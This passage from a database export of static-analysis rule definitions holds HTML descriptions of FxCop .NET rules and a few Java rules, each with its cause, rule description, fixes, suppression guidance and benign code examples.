Stack\n\n\n\n\n                        <code>System.Collections.Stack</code>\n\n\n\n\n\n\n                    Stream\n\n\n\n\n                        <code>System.IO.Stream</code>\n\n\n\n\n\n\n            In addition, the following suffixes should not be used:\n            <ul>\n              <li>\n                Delegate\n              </li>\n              <li>\n                Enum\n              </li>\n              <li>\n                Impl - use 'Core' instead\n              </li>\n              <li>\n                Ex or similar suffix to distinguish it from an earlier version of the same type\n              </li>\n            </ul>\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Remove the suffix from the type name.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule unless the suffix has an unambiguous meaning in the application domain.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldHaveCorrectSuffix}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182247.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182247.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806810	1511453806811	1
361	CA2216: Disposable types should declare finalizer	DisposableTypesShouldDeclareFinalizer	CA2216	fxcop	<h2>Cause</h2>\n<p>\n            A type that implements <code>System.IDisposable</code>, and has fields that suggest the use of unmanaged resources, does not implement a finalizer as described by <code>Object.Finalize</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A violation of this rule is reported if the disposable type contains fields of the following types:\n            <ul>\n              <li>\n\n\n                    <code>System.IntPtr</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.UIntPtr</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Runtime.InteropServices.HandleRef</code>\n\n\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement a finalizer that calls your <code>Dispose</code> method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the type does not implement <code>IDisposable</code> for the purpose of releasing unmanaged resources.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:CallGCKeepAliveWhenUsingNativeResources}<br/>\n\n\n\n\n                {rule:fxcop:CallGCSuppressFinalizeCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:TypesThatOwnNativeResourcesShouldBeDisposable}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182329.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182329.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806811	1511453806812	1
362	CA2000: Dispose objects before losing scope	DisposeObjectsBeforeLosingScope	CA2000	fxcop	<h2>Cause</h2>\n<p>\n            A local object of a <code>IDisposable</code> type is created but the object is not disposed before all references to the object are out of scope.\n</p>\n<h2>Rule Description</h2>\n<p>\n            If a disposable object is not explicitly disposed before all references to it are out of scope, the object will be disposed at some indeterminate time when the garbage collector runs the finalizer of the object. Because an exceptional event might occur that will prevent the finalizer of the object from running, the object should be explicitly disposed instead.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, call <code>Dispose</code> on the object before all references to it are out of scope.\n            Note that you can use the <code>using</code> statement (<code>Using</code> in Visual Basic) to wrap objects that implement <code>IDisposable</code>. Objects that are wrapped in this manner will automatically be disposed at the close of the <code>using</code> block.\n            The following are some situations where the using statement is not enough to protect IDisposable objects and can cause CA2000 to occur.\n            <ul>\n              <li>\n                Returning a disposable object requires that the object is constructed in a try/finally block outside a using block.\n              </li>\n              <li>\n                Initializing members of a disposable object should not be done in the constructor of a using statement.\n              </li>\n              <li>\n                Nesting constructors that are protected only by one exception handler. For example,\n\n\n\n\n\n\n\n\n\n            <pre>\nusing (StreamReader sr = new StreamReader(new FileStream("C:\\myfile.txt", FileMode.Create)))\n{ ... }\n</pre>\n\n\n\n\ncauses CA2000 to occur because a failure in the construction of the StreamReader object can result in the FileStream object never being closed.</li>\n              <li>\n                Dynamic objects should use a shadow object to implement the Dispose pattern of IDisposable objects.\n              </li>\n            </ul>\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule unless you have called a method on your object that calls <code>Dispose</code>, such as <code>Close</code>, or if the method that raised the warning returns an IDisposable object wraps your object.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:DisposableFieldsShouldBeDisposed}<br/>\n\n\n\n\n                {rule:fxcop:DoNotDisposeObjectsMultipleTimes}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182289.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182289.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806812	1511453806813	1
363	CA2116: APTCA methods should only call APTCA methods	AptcaMethodsShouldOnlyCallAptcaMethods	CA2116	fxcop	<h2>Cause</h2>\n<p>\n            A method in an assembly with the <code>System.Security.AllowPartiallyTrustedCallersAttribute</code> attribute calls a method in an assembly that does not have the attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n            By default, public or protected methods in assemblies with strong names are implicitly protected by a Link Demands for full trust; only fully trusted callers can access a strong-named assembly. Strong-named assemblies marked with the <code>AllowPartiallyTrustedCallersAttribute</code> (APTCA) attribute do not have this protection. The attribute disables the link demand, making the assembly accessible to callers that do not have full trust, such as code executing from an intranet or the Internet.\n            When the APTCA attribute is present on a fully trusted assembly, and the assembly executes code in another assembly that does not allow partially trusted callers, a security exploit is possible. If two methods M1 and M2 meet the following conditions, malicious callers can use the method M1 to bypass the implicit full trust link demand that protects M2:\n            <ul>\n              <li>\n\n                  M1 is a public method declared in a fully trusted assembly that has the APTCA attribute.\n              </li>\n              <li>\n\n                  M1 calls a method M2 outside M1's assembly.\n              </li>\n              <li>\n\n                  M2's assembly does not have the APTCA attribute and, therefore, should not be executed by or on behalf of callers that are partially trusted.\n              </li>\n            </ul>\n            A partially trusted caller X can call method M1, causing M1 to call M2. Because M2 does not have the APTCA attribute, its immediate caller (M1) must satisfy a link demand for full trust; M1 has full trust and therefore satisfies this check. The security risk is because X does not participate in satisfying the link demand that protects M2 from untrusted callers. Therefore, methods with the APTCA attribute must not call methods that do not have the attribute.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            If the APCTA attribute is required, use a demand to protect the method that calls into the full trust assembly. The exact permissions you demand will depend on the functionality exposed by your method. If it is possible, protect the method with a demand for full trust to ensure that the underlying functionality is not exposed to partially trusted callers. If this is not possible, select a set of permissions that effectively protects the exposed functionality. For more information about demands, see <code>Demands</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            To safely suppress a warning from this rule, you must ensure that the functionality exposed by your method does not directly or indirectly allow callers to access sensitive information, operations, or resources that can be used in a destructive manner.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AptcaTypesShouldOnlyExtendAptcaBaseTypes}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182297.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182297.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806813	1511453806814	1
366	CA1302: Do not hardcode locale specific strings	DoNotHardcodeLocaleSpecificStrings	CA1302	fxcop	<h2>Cause</h2>\n<p>\n            A method uses a string literal that represents part of the path of certain system folders.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The <code>System.Environment.SpecialFolder</code> enumeration contains members that refer to special system folders. The locations of these folders can have different values on different operating systems, the user can change some of the locations, and the locations are localized. An example of a special folder is the System folder, which is "C:\\WINDOWS\\system32" on Windows XP but "C:\\WINNT\\system32" on Windows 2000. The <code>Environment.GetFolderPath</code> method returns the locations that are associated with the <code>Environment.SpecialFolder</code> enumeration. The locations that are returned by <code>GetFolderPath</code> are localized and appropriate for the currently running computer.\n            This rule tokenizes the folder paths that are retrieved by using the <code>GetFolderPath</code> method into separate directory levels. Each string literal is compared to the tokens. If a match is found, it is assumed that the method is building a string that refers to the system location that is associated with the token. For portability and localizability, use the <code>GetFolderPath</code> method to retrieve the locations of the special system folders instead of using string literals.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, retrieve the location by using the <code>GetFolderPath</code> method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the string literal is not used to refer to one of the system locations that is associated with the <code>Environment.SpecialFolder</code> enumeration.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DoNotPassLiteralsAsLocalizedParameters}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182186.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182186.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806817	1511453806817	1
364	CA1407: Avoid static members in COM visible types	AvoidStaticMembersInComVisibleTypes	CA1407	fxcop	<h2>Cause</h2>\n<p>\n            A type that is specifically marked as visible to Component Object Model (COM) contains a <code>public</code> <code>static</code> method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            COM does not support <code>static</code> methods.\n            This rule ignores property and event accessors, operator overloading methods, or methods that are marked by using either the <code>System.Runtime.InteropServices.ComRegisterFunctionAttribute</code> attribute or the <code>System.Runtime.InteropServices.ComUnregisterFunctionAttribute</code> attribute.\n            By default, the following are visible to COM: assemblies, public types, public instance members in public types, and all members of public value types.\n            For this rule to occur, an assembly-level <code>ComVisibleAttribute</code> must be set to <code>false</code> and the class- <code>ComVisibleAttribute</code> must be set to <code>true</code>, as the following code shows.\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Runtime.InteropServices;\n\n[assembly: ComVisible(false)]\nnamespace Samples\n{\n    [ComVisible(true)]\n    public class MyClass\n    {\n        public static void DoSomething()\n        {\n        }\n    }\n}\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n                How to Fix Violations\n\n\n\n\n\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if a COM client does not require access to the functionality that is provided by the <code>static</code> method.\n</p>\n<h2>Example Violation</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a <code>static</code> method that violates this rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Runtime.InteropServices;\nusing System.Collections.ObjectModel;\n\n[assembly: ComVisible(false)]\n\nnamespace Samples\n{\n    [ComVisible(true)]\n    public class Book\n    {\n        private Collection&lt;string&gt; _Pages = new Collection&lt;string&gt;();\n\n        public Book()\n        {\n        }\n\n        public Collection&lt;string&gt; Pages\n        {\n            get { return _Pages; }\n        }\n\n        // Violates this rule         \n        public static Book FromPages(string[] pages)\n        {\n            if (pages == null)\n                throw new ArgumentNullException("pages");\n\n            Book book = new Book();\n\n            foreach (string page in pages)\n            {\n                book.Pages.Add(page);\n            }             return book;\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h3>Comments</h3>\n<p>\n                In this example, the Book.FromPages method cannot be called from COM.\n</p>\n<h2>Example Fix</h2>\n\n<h3>Description</h3>\n<p>\n                To fix the violation in the previous example, you could change the method to an instance method, but that does not make sense in this instance. A better solution is to explicitly apply ComVisible(false) to the method to make it clear to other developers that the method cannot be seen from COM.\n                The following example applies <code>ComRegisterFunctionAttribute</code> to the method.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Runtime.InteropServices;\nusing System.Collections.ObjectModel;\n\n[assembly: ComVisible(false)]\n\nnamespace Samples\n{\n    [ComVisible(true)]\n    public class Book\n    {\n        private Collection&lt;string&gt; _Pages = new Collection&lt;string&gt;();\n\n        public Book()\n        {\n        }\n\n        public Collection&lt;string&gt; Pages\n        {\n            get { return _Pages; }\n        }\n\n        [ComVisible(false)]\n        public static Book FromPages(string[] pages)\n        {\n            if (pages == null)\n                throw new ArgumentNullException("pages");\n\n            Book book = new Book();\n\n            foreach (string page in pages)\n            {\n                book.Pages.Add(page);\n            }\n\n            return book;\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:MarkAssembliesWithComVisible}<br/>\n\n\n\n\n                {rule:fxcop:AvoidInt64ArgumentsForVB6Clients}<br/>\n\n\n\n\n                {rule:fxcop:AvoidNonpublicFieldsInComVisibleValueTypes}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182198.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182198.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806814	1511453806815	1
365	CA1720: Identifiers should not contain type names	IdentifiersShouldNotContainTypeNames	CA1720	fxcop	<h2>Cause</h2>\n<p>\n            The name of a parameter in an externally visible member contains a data type name.\n            -or-\n            The name of an externally visible member contains a language-specific data type name.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Names of parameters and members are better used to communicate their meaning than to describe their type, which is expected to be provided by development tools. For names of members, if a data type name must be used, use a language-independent name instead of a language-specific one. For example, instead of the C# type name 'int', use the language-independent data type name, Int32.\n            Each discrete token in the name of the parameter or member is checked against the following language-specific data type names, in a case-insensitive manner:\n            <ul>\n              <li>\n                Bool\n              </li>\n              <li>\n                WChar\n              </li>\n              <li>\n                Int8\n              </li>\n              <li>\n                UInt8\n              </li>\n              <li>\n                Short\n              </li>\n              <li>\n                UShort\n              </li>\n              <li>\n                Int\n              </li>\n              <li>\n                UInt\n              </li>\n              <li>\n                Integer\n              </li>\n              <li>\n                UInteger\n              </li>\n              <li>\n                Long\n              </li>\n              <li>\n                ULong\n              </li>\n              <li>\n                Unsigned\n              </li>\n              <li>\n                Signed\n              </li>\n              <li>\n                Float\n              </li>\n              <li>\n                Float32\n              </li>\n              <li>\n                Float64\n              </li>\n            </ul>\n            In addition, the names of a parameter are also checked against the following language-independent data type names, in a case-insensitive manner:\n            <ul>\n              <li>\n                Object\n              </li>\n              <li>\n                Obj\n              </li>\n              <li>\n                Boolean\n              </li>\n              <li>\n                Char\n              </li>\n              <li>\n                String\n              </li>\n              <li>\n                SByte\n              </li>\n              <li>\n                Byte\n              </li>\n              <li>\n                UByte\n              </li>\n              <li>\n                Int16\n              </li>\n              <li>\n                UInt16\n              </li>\n              <li>\n                Int32\n              </li>\n              <li>\n                UInt32\n              </li>\n              <li>\n                Int64\n              </li>\n              <li>\n                UInt64\n              </li>\n              <li>\n                IntPtr\n              </li>\n              <li>\n                Ptr\n              </li>\n              <li>\n                Pointer\n              </li>\n              <li>\n                UInptr\n              </li>\n              <li>\n                UPtr\n              </li>\n              <li>\n                UPointer\n              </li>\n              <li>\n                Single\n              </li>\n              <li>\n                Double\n              </li>\n              <li>\n                Decimal\n              </li>\n              <li>\n                Guid\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n\n              If fired against a parameter:\n\n            Replace the data type identifier in the name of the parameter with either a term that better describes its meaning or a more generic term, such as 'value'.\n\n              If fired against a member:\n\n            Replace the language-specific data type identifier in the name of the member with a term that better describes its meaning, a language-independent equivalent, or a more generic term, such as 'value'.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Occasional use of type-based parameter and member names might be appropriate. However, for new development, no known scenarios occur where you should suppress a warning from this rule. For libraries that have previous shipped, you might have to suppress a warning from this rule.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}<br/>\n\n\n\n\n                {rule:fxcop:IdentifiersShouldNotContainUnderscores}<br/>\n\n\n\n\n                {rule:fxcop:ParameterNamesShouldNotMatchMemberNames}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb531486.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb531486.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806816	1511453806816	1
501	Array designators "[]" should be on the type, not the variable	S1197	S1197	squid	<p>\n  Array designators should always be located on the type for better code readability.\n  Otherwise, developers must look both at the type and the variable name to know whether or\n  not a variable is an array.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nint matrix[][];   // Noncompliant\nint[] matrix[];   // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nint[][] matrix;   // Compliant\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453807023	1511453807023	1
502	Math should not be performed on floats	S2164	S2164	squid	For small numbers, <code>float</code> math has enough precision to yield the expected value, but for larger numbers, it does not. <code>BigDecimal</code> is the best alternative, but if a primitive is required, use a <code>double</code>.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfloat a = 16777216.0f;\nfloat b = 1.0f;\nfloat c = a + b; // Noncompliant; yields 1.6777216E7 not 1.6777217E7\n\ndouble d = a + b; // Noncompliant; addition is still between 2 floats\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfloat a = 16777216.0f;\nfloat b = 1.0f;\nBigDecimal c = BigDecimal.valueOf(a).add(BigDecimal.valueOf(b));\n\ndouble d = (double)a + (double)b;\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453807023	1511453807024	2
367	CA1809: Avoid excessive locals	AvoidExcessiveLocals	CA1809	fxcop	<h2>Cause</h2>\n<p>\n            A member contains more than 64 local variables, some of which might be compiler-generated.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A common performance optimization is to store a value in a processor register instead of in memory, which is referred to as enregistering the value. The common language runtime considers up to 64 local variables for enregistration. Variables that are not enregistered are put on the stack and must be moved to a register before manipulation. To allow the chance that all local variables get enregistered, limit the number of local variables to 64.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, refactor the implementation to use no more than 64 local variables.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule, or to disable the rule, if performance is not an issue.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:RemoveUnusedLocals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182263.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182263.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806818	1511453806818	1
368	CA2108: Review declarative security on value types	ReviewDeclarativeSecurityOnValueTypes	CA2108	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected value type is secured by a <code>Data and Modeling in the .NET Framework</code> or Link Demands.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Value types are allocated and initialized by their default constructors before other constructors execute. If a value type is secured by a Demand or LinkDemand, and the caller does not have permissions that satisfy the security check, any constructor other than the default will fail, and a security exception will be thrown. The value type is not deallocated; it is left in the state set by its default constructor. Do not assume that a caller that passes an instance of the value type has permission to create or access the instance.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            You cannot fix a violation of this rule unless you remove the security check from the type, and use method level security checks in its place. Note that fixing the violation in this manner will not prevent callers with inadequate permissions from obtaining instances of the value type. You must ensure that an instance of the value type, in its default state, does not expose sensitive information, and cannot be used in a harmful manner.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            You can suppress a warning from this rule if any caller can obtain instances of the value type in its default state without posing a threat to security.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182307.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182307.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806819	1511453806819	1
369	CA2211: Non-constant fields should not be visible	NonConstantFieldsShouldNotBeVisible	CA2211	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected static field is not constant nor is it read-only.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Static fields that are neither constants nor read-only are not thread-safe. Access to such a field must be carefully controlled and requires advanced programming techniques for synchronizing access to the class object. Because these are difficult skills to learn and master, and testing such an object poses its own challenges, static fields are best used to store data that does not change. This rule applies to libraries; applications should not expose any fields.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, make the static field constant or read-only. If this is not possible, redesign the type to use an alternative mechanism such as a thread-safe property that manages thread-safe access to the underlying field. Realize that issues such as lock contention and deadlocks might affect the performance and behavior of the library.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if you are developing an application and therefore have full control over access to the type that contains the static field. Library designers should not suppress a warning from this rule; using non-constant static fields can make using the library difficult for developers to use correctly.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182353.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182353.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806820	1511453806820	1
370	CA2232: Mark Windows Forms entry points with STAThread	MarkWindowsFormsEntryPointsWithStaThread	CA2232	fxcop	<h2>Cause</h2>\n<p>\n            An assembly references the <code>System.Windows.Forms</code> namespace, and its entry point is not marked with the <code>System.STAThreadAttribute</code> attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>STAThreadAttribute</code>\n               indicates that the COM threading model for the application is single-threaded apartment. This attribute must be present on the entry point of any application that uses Windows Forms; if it is omitted, the Windows components might not work correctly. If the attribute is not present, the application uses the multithreaded apartment model, which is not supported for Windows Forms.\n\n\n\n\n\n                    Note\n\n\n\n\n                     Visual Basic projects that use the Application Framework do not have to mark the Main method with STAThread. The Visual Basic compiler does it automatically.\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add the <code>STAThreadAttribute</code> attribute to the entry point. If the <code>System.MTAThreadAttribute</code> attribute is present, remove it.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if you are developing for the .NET Compact Framework, for which the <code>STAThreadAttribute</code> attribute is unnecessary and not supported.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182351.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182351.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806821	1511453806821	1
371	CA1023: Indexers should not be multidimensional	IndexersShouldNotBeMultidimensional	CA1023	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type contains a public or protected indexer that uses more than one index.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Indexers, that is, indexed properties, should use a single index. Multi-dimensional indexers can significantly reduce the usability of the library. If the design requires multiple indexes, reconsider whether the type represents a logical data store. If not, use a method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the design to use a lone integer or string index, or use a method instead of the indexer.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule only after carefully considering the need for the nonstandard indexer.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:UseIntegralOrStringArgumentForIndexers}<br/>\n\n\n\n\n                {rule:fxcop:UsePropertiesWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182152.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182152.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806822	1511453806822	1
372	CA1027: Mark enums with FlagsAttribute	MarkEnumsWithFlags	CA1027	fxcop	<h2>Cause</h2>\n<p>\n            The values of a public enumeration are powers of two or are combinations of other values that are defined in the enumeration, and the <code>System.FlagsAttribute</code> attribute is not present. To reduce false positives, this rule does not report a violation for enumerations that have contiguous values.\n</p>\n<h2>Rule Description</h2>\n<p>\n            An enumeration is a value type that defines a set of related named constants. Apply <code>FlagsAttribute</code> to an enumeration when its named constants can be meaningfully combined. For example, consider an enumeration of the days of the week in an application that keeps track of which day's resources are available. If the availability of each resource is encoded by using the enumeration that has <code>FlagsAttribute</code> present, any combination of days can be represented. Without the attribute, only one day of the week can be represented.\n            For fields that store combinable enumerations, the individual enumeration values are treated as groups of bits in the field. Therefore, such fields are sometimes referred to as bit fields. To combine enumeration values for storage in a bit field, use the Boolean conditional operators. To test a bit field to determine whether a specific enumeration value is present, use the Boolean logical operators. For a bit field to store and retrieve combined enumeration values correctly, each value that is defined in the enumeration must be a power of two. Unless this is so, the Boolean logical operators will not be able to extract the individual enumeration values that are stored in the field.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add <code>FlagsAttribute</code> to the enumeration.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule if you do not want the enumeration values to be combinable.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DoNotMarkEnumsWithFlags}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182159.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182159.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806822	1511453806823	1
373	CA1402: Avoid overloads in COM visible interfaces	AvoidOverloadsInComVisibleInterfaces	CA1402	fxcop	<h2>Cause</h2>\n<p>\n            A Component Object Model (COM) visible interface declares overloaded methods.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When overloaded methods are exposed to COM clients, only the first method overload retains its name. Subsequent overloads are uniquely renamed by appending to the name an underscore character '_' and an integer that corresponds to the order of declaration of the overload. For example, consider the following methods.\n\n\n\n\n\n\n\n\n\n            <pre>\n   void SomeMethod(int valueOne);\n   void SomeMethod(int valueOne, int valueTwo, int valueThree);\n   void SomeMethod(int valueOne, int valueTwo);\n</pre>\n\n\n\n\nThese methods are exposed to COM clients as the following.\n\n\n\n\n\n\n\n\n\n            <pre>\n   void SomeMethod(int valueOne);\n   void SomeMethod_2(int valueOne, int valueTwo, int valueThree);\n   void SomeMethod_3(int valueOne, int valueTwo);\n</pre>\n\n\n\n\nVisual Basic 6 COM clients cannot implement interface methods by using an underscore in the name.\n\n\n\n\n\n\n                How to Fix Violations\n\n\n\n\n\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidNonpublicFieldsInComVisibleValueTypes}<br/>\n\n\n\n\n                {rule:fxcop:AvoidStaticMembersInComVisibleTypes}<br/>\n\n\n\n\n                {rule:fxcop:MarkAssembliesWithComVisible}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182197.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182197.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806824	1511453806824	1
374	CA2132: Default constructors must be at least as critical as base type default constructors	DefaultConstructorsMustHaveConsistentTransparency	CA2132	fxcop	<h2>Cause</h2>\n<p>\n            The transparency attribute of the default constructor of a derived class is not as critical as the transparency of the base class.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Types and members that have the <code>SecurityCriticalAttribute</code> cannot be used by Silverlight application code. Security-critical types and members can be used only by trusted code in the .NET Framework for Silverlight class library. Because a public or protected construction in a derived class must have the same or greater transparency than its base class, a class in an application cannot be derived from a class marked SecurityCritical.\n            For CoreCLR platform code, if a base type has a public or protected non-transparent default constructor then the derived type must obey the default constructor inheritance rules. The derived type must also have a default constructor and that constructor must be at least as critical default constructor of the base type.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix the violation, remove the type or do not derive from security non-transparent type.\n</p>\n<h2>When to Suppress Warnings</h2>\n\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Security;\n\nnamespace TransparencyWarningsDemo\n{\n\n    public class BaseWithSafeCriticalDefaultCtor\n    {\n        [SecuritySafeCritical]\n        public BaseWithSafeCriticalDefaultCtor() { }\n    }\n\n    public class DerivedWithNoDefaultCtor : BaseWithSafeCriticalDefaultCtor\n    {\n        // CA2132 violation - since the base has a public or protected non-transparent default .ctor, the \n        // derived type must also have a default .ctor\n    }\n\n    public class DerivedWithTransparentDefaultCtor : BaseWithSafeCriticalDefaultCtor\n    {\n        // CA2132 violation - since the base has a safe critical default .ctor, the derived type must have \n        // either a safe critical or critical default .ctor.  This is fixed by making this .ctor safe critical 